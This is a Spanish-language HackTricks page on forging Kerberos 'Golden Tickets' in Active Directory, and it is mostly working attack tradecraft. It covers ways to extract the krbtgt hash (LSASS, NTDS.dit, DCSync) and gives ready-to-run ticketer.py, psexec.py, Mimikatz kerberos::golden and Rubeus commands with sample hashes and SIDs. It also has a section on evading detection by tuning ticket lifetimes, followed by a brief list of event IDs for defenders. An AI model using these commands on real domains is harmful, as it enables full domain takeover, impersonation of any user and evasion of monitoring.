# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

Un ataque de **Golden Ticket** consiste en la **creación de un Ticket Granting Ticket (TGT) legítimo suplantando a cualquier usuario** mediante el uso del **hash NTLM de la cuenta krbtgt de Active Directory (AD)**. Esta técnica es particularmente ventajosa porque **permite el acceso a cualquier servicio o máquina** dentro del dominio como el usuario suplantado. Es crucial recordar que las **credenciales de la cuenta krbtgt nunca se actualizan automáticamente**.

Para **adquirir el hash NTLM** de la cuenta krbtgt, se pueden emplear varios métodos. Puede ser extraído del **proceso de Local Security Authority Subsystem Service (LSASS)** o del **archivo NT Directory Services (NTDS.dit)** ubicado en cualquier Controlador de Dominio (DC) dentro del dominio. Además, **ejecutar un ataque DCsync** es otra estrategia para obtener este hash NTLM, que se puede realizar utilizando herramientas como el **módulo lsadump::dcsync** en Mimikatz o el **script secretsdump.py** de Impacket. Es importante subrayar que para llevar a cabo estas operaciones, **normalmente se requieren privilegios de administrador de dominio o un nivel de acceso similar**.

Aunque el hash NTLM sirve como un método viable para este propósito, se **recomienda encarecidamente** **forjar tickets utilizando las claves Kerberos del Estándar de Cifrado Avanzado (AES) (AES128 y AES256)** por razones de seguridad operativa.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Desde Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Una vez** que tengas el **golden Ticket inyectado**, puedes acceder a los archivos compartidos **(C$)** y ejecutar servicios y WMI, por lo que podrías usar **psexec** o **wmiexec** para obtener un shell (parece que no puedes obtener un shell a través de winrm).

### Eludir detecciones comunes

Las formas más frecuentes de detectar un golden ticket son **inspeccionando el tráfico de Kerberos** en la red. Por defecto, Mimikatz **firma el TGT por 10 años**, lo que se destacará como anómalo en las solicitudes TGS posteriores realizadas con él.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utiliza los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desplazamiento de inicio, la duración y las renovaciones máximas (todo en minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Desafortunadamente, la duración del TGT no se registra en los 4769, por lo que no encontrarás esta información en los registros de eventos de Windows. Sin embargo, lo que puedes correlacionar es **ver 4769 sin un previo 4768**. **No es posible solicitar un TGS sin un TGT**, y si no hay registro de que se haya emitido un TGT, podemos inferir que fue forjado fuera de línea.

Para **eludir esta detección**, verifica los tickets de diamante:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigación

* 4624: Inicio de sesión de cuenta
* 4672: Inicio de sesión de administrador
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Otros pequeños trucos que los defensores pueden hacer es **alertar sobre 4769 para usuarios sensibles** como la cuenta de administrador de dominio predeterminada.

## Referencias
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
